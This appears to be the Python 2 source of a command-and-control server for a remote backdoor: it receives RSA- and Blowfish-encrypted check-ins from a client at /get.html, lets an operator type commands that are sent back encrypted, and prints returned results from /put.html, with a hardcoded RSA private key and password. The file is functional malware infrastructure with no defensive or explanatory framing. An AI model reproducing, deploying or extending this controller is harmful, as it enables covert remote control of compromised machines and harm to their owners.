#! /usr/bin/python

# 
# Copyright (c) 2010 GhostHunter
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


import string,cgi,time,binascii, rsa, random, sys
from os import curdir, sep
from blowfish import *
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer


private={'q': 43615811671814373094973431074211611904027744219778025801720557316822230250434056544051507340719175444092355583020411221349351216897664107344623761234830363376199492849362431206989657924029014046206483706730617743375805145152388688032487117844662631241109359000572747929989619430228147813905246546098397291487L, 'p': 152930877457113091873297711980178686176081054477979188664949169171308019566743503223789650266415620122641795368014548446833804975022572957821386974923833198207253213410141004758538967313032902107155780629415154943427618382407936805600244475709731511817249701995901307412547057212753855838527041140583136546083L, 'd': 717119285846981259123790183711565570941015506498217982140523045665647499093664340912431683794241803027115370417810645747847338826808600767695759833004561942803937752154483901427399923113938784785407951780672817533252001683343850040539774178319652601964230462305719271831991346570742051125845423805466414352814792825905554160356874359556168363176146587890558200913905812516970914739816948853253918369023786025143289854503914179166677835860441013946049711864769062812645475312605837307764817042965608618046833445898066028707155933035012678573271172997097834721029190621723637082181869521629401426565153285718263890393L}

class MyHandler(BaseHTTPRequestHandler):

    passwd="12345678910"
    received_pass=""
    command_response=""

    def get_parameters(self):
       key=""
       command=""
       length = int(self.headers.getheader('content-length'))
       ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
       if ctype == 'application/x-www-form-urlencoded':
              qs = self.rfile.read(length)
              values=cgi.parse_qs(qs, keep_blank_values=1)
              try:
                     passwd=rsa.decrypt(binascii.unhexlify(values['key'][0]),private)
                     command=decrypt( binascii.unhexlify(values['cmd'][0]) ,rsa.decrypt(binascii.unhexlify(values['key'][0]),private))
              except KeyError:
                  pass
              
              except TypeError:
                  pass
       return command,passwd


    def do_POST(self):
            if self.path=="/get.html":
                    self.command_response,self.passwd=self.get_parameters()
                    if self.command_response=="HELLO":
                            command=raw_input("Ready to send a command: ")
	                    output="cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
                            self.send_response(200)
                            self.end_headers()
                            self.wfile.write(output)
                            print "Sent command: %s" % command
                    else:
                            self.send_response(404)
                            self.end_headers()

            elif self.path=="/put.html":
                    self.command_response,self.passwd=self.get_parameters()
                    self.send_response(200)
                    self.end_headers()
                    print "command response:\n%s" % (self.command_response)

            else:
                    self.send_response(404)
                    self.end_headers()

def main():
    try:
        #server = HTTPServer(('', 8080), MyHandler)
        server = HTTPServer(('127.0.0.1', 8080), MyHandler)
        print 'started httpserver...'
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
        server.socket.close()

if __name__ == '__main__':
    main()

